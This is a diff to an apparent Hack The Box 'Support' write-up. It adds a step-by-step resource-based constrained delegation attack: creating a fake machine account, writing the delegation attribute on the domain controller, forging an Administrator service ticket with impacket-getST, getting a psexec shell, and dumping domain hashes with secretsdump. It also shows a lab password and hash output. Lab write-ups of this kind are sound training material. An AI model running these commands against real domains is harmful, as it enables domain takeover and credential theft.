@@ -8,7 +8,7 @@ summary: Placeholder
 
 <TOCInline toc={props.toc} asDisclosure />
 
-## Scanning
+# Scanning
 
 ```
 ❯ nmap -sV -sC -v -Pn 10.129.230.181
@@ -86,7 +86,7 @@ Nmap done: 1 IP address (1 host up) scanned in 162.00 seconds
 
 ---
 
-## Enumeration
+# Enumeration
 
 ```
 ❯ nxc smb support.htb -u 'a' -p '' --users
@@ -114,6 +114,8 @@ Apart from the other programs, we can notice an interesting zip file called `Use
 are probably required to run the program and the executable itself. We also find that the executable is a .NET application
 
 ![Description](/static/images/htb/windows/support/4.jpg)
+
+# Reversing
 
 We can utlize a .NET debugger like dnSpy to debug and disassemble the application
 
@@ -188,6 +190,8 @@ Let us verify the credentials
 
 Yep, we got it
 
+# Enumeration Pt.2
+
 Enumerate users
 
 ```
@@ -230,10 +234,14 @@ Valid, lets goo. Lets us try querying for Bloodhound data
 
 ![Description](/static/images/htb/windows/support/14.jpg)
 
+# Gaining Access
+
 Finally works bruh, we can see user `support` is a member of the Remote Management Users group. We can easily retrieve
 the user flag
 
 ![Description](/static/images/htb/windows/support/15.jpg)
+
+# Privilege Escalation
 
 User `support` is also a member of the `Shared Support Account` which has `GenericAll` over a computer account which is
 the Domain Controller itself
@@ -252,7 +260,7 @@ Simply put, its a feature that enables administrators to delegate permissions in
 
 So I am going to do this in 2 methods, the easy method and the manual method to further explore the requirements of this attack
 
-# The Easy Method
+## The Easy Method
 
 We can just follow what Bloodhound suggested with 3 commands. First, we need to add a rogue computer
 
@@ -325,10 +333,217 @@ DC$:1000:aad3b435b51404eeaad3b435b51404ee:e2e3a4338eadd9bf0f6f640e68c82340:::
 ATTACKERSYSTEM$:6101:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
 ```
 
-# The Manual Method
+## The Manual Method
 
-The attached below is an amazing explanation and step by step video on how to exploit this. I will use it as my reference
+The attached below is an amazing explanation and step by step video form SpecterOps on how to exploit this. I will use it as my reference
 
 <YouTubeEmbed videoId="RUbADHcBLKg" title="BloodHound 2.1's New Computer Takeover Attack" />
 
-Fir
+### Requirements
+
+First we need to identify the target computer. Looking at Bloodhound, we have arbitrary write
+access over the  target computer which is `DC$` which we can then create a TGT or DCSync
+to get the NTLM hashes
+
+![Description](/static/images/htb/windows/support/22.jpg)
+
+Clicking on the target computer node will show that `Administrator` also has admin rights over the computer
+
+![Description](/static/images/htb/windows/support/23.jpg)
+
+Next we will use Powerview on user `support` to query some info and retrieve the conditions on launching the attack
+
+```
+❯ powerview 'support':'Ironside47pleasure40Watchful'@support.htb
+```
+
+Get the DN for the domain
+
+```
+PV ❯ Get-DomainUser support
+```
+
+![Description](/static/images/htb/windows/support/24.jpg)
+
+Specify the DN as the identity we want to find
+
+```
+PV ❯ Get-DomainObject -Identity DC=support,DC=htb
+```
+
+Observe that an admin/non-admin is allowed to add up to 10 computers in the domain
+
+![Description](/static/images/htb/windows/support/25.jpg)
+
+We also need at least 1 Windows Server 2012 or newer Domain Controller for the attack to work
+
+```
+PV ❯ Get-DomainController -Properties Name,OperatingSystem -TableView
+
+Name    OperatingSystem
+------  ----------------------------
+DC      Windows Server 2022 Standard
+```
+
+And we need to make sure the `msds-allowedtoactonbehalfofotheridentity` attribute is not configured
+
+```
+PV ❯ Get-DomainController -Properties Name,msds-allowedtoactonbehalfofotheridentity -TableView
+
+Name    msds-allowedtoactonbehalfofotheridentity
+------  ------------------------------------------
+DC
+```
+
+Great now we can execute our attack
+
+### Attack
+
+#### Creating a Fake Computer
+
+WinRM into our compromised user which is `support`. Upload and Import PowerMad and also the Powerview
+script so we can use some of their function commandlets
+
+```Powershell
+PS C:\Users\support\Documents> Import-Module ./Powermad.ps1
+PS C:\Users\support\Documents> Import-Module ./PowerView.ps1
+```
+
+Add the new computer (machine account) that we control with a password
+
+```Powershell
+PS C:\Users\support\Documents> New-MachineAccount -MachineAccount FakeComputer -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
+
+[+] Machine account FakeComputer added
+```
+
+Verify that it worked and retrieve the SID
+
+```Powershell
+PS C:\Users\support\Documents> Get-DomainComputer FakeComputer
+
+...
+...
+objectsid              : S-1-5-21-1677581083-3380853377-188903654-6101
+...
+...
+```
+
+Now we have collected these important details:
+
+1. Target Computer Name: `DC`
+2. Admin on Target Computer `Administrator`
+3. Fake Computer Name: `FakeComputer`
+4. Fake Computer SID: `S-1-5-21-1677581083-3380853377-188903654-6101`
+5. Fake Computer PAssword: `Password123!`
+
+#### Modifying The Property
+
+We create a Security Descriptor (SD) that includes the SID above as the identity to act on behalf of other users on the
+target computer.
+
+We then set this SD on the `msds-allowedtoactonbehalfofotheridentity` attribute of the target computer
+
+```Powershell
+PS C:\Users\support\Documents> $ComputerSid = Get-DomainComputer FakeComputer -Properties objectsid | Select -Expand objectsid
+PS C:\Users\support\Documents> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+PS C:\Users\support\Documents> $SDBytes = New-Object byte[] ($SD.BinaryLength)
+PS C:\Users\support\Documents> $SD.GetBinaryForm($SDBytes, 0)
+PS C:\Users\support\Documents> Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+```
+
+#### Verifying The Change
+
+```Powershell
+PS C:\Users\support\Documents> Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+PS C:\Users\support\Documents> $RawBytes = Get-DomainComputer FakeComputer -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
+PS C:\Users\support\Documents> $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
+PS C:\Users\support\Documents> $Descriptor.DiscretionaryAcl
+
+
+BinaryLength       : 36
+AceQualifier       : AccessAllowed
+IsCallback         : False
+OpaqueLength       : 0
+AccessMask         : 983551
+SecurityIdentifier : S-1-5-21-1677581083-3380853377-188903654-6101
+AceType            : AccessAllowed
+AceFlags           : None
+IsInherited        : False
+InheritanceFlags   : None
+PropagationFlags   : None
+AuditFlags         : None
+```
+
+#### S4U2Self & S4U2Proxy
+
+Notice now we have the `AccessAllowed` ACE. By now, we can use Rubeus' s4u command to perform S4U2Self and S4U2Proxy but for some reason I could not do that.
+So I opted to just use the `getST` tool from Impacket's suite to get the Service Ticket
+
+```
+❯ impacket-getST -spn cifs/dc.support.htb -impersonate Administrator support.htb/FakeComputer$:Password123!
+```
+
+This performs S4U2Self to get the Service Ticket for Administrator on the FakeComputer, then it takes that ticket to perform S4U2Proxy to request another
+service ticket to the the SPN (Service Principal Name) we specified on the target computer on behalf of the Administrator. In this case, its the CIFS service.
+
+![Description](/static/images/htb/windows/support/26.jpg)
+
+After that we export the ticket to the `KRB5CCNAME` variable
+
+```
+export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
+```
+
+Get a psexec shell using Kerberos auth
+
+```
+❯ impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass
+```
+
+![Description](/static/images/htb/windows/support/27.jpg)
+
+And like the previous method, we can dump everyone's hashes
+
+```
+❯ impacket-secretsdump -k DC.support.htb
+
+...
+...
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6303be52e22950b5bcb764ff2b233302:::
+ldap:1104:aad3b435b51404eeaad3b435b51404ee:b735f8c7172b49ca2b956b8015eb2ebe:::
+support:1105:aad3b435b51404eeaad3b435b51404ee:11fbaef07d83e3f6cde9f0ff98a3af3d:::
+smith.rosario:1106:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+hernandez.stanley:1107:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+wilson.shelby:1108:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+anderson.damian:1109:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+thomas.raphael:1110:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+levine.leopoldo:1111:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+raven.clifton:1112:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+bardot.mary:1113:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+cromwell.gerard:1114:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+monroe.david:1115:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+west.laura:1116:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+langley.lucy:1117:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+daughtler.mabel:1118:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+stoll.rachelle:1119:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+ford.victoria:1120:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+DC$:1000:aad3b435b51404eeaad3b435b51404ee:e2e3a4338eadd9bf0f6f640e68c82340:::
+ATTACKERSYSTEM$:6101:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+```
+
+
+
+
+
+
+
+
+
+
+
+
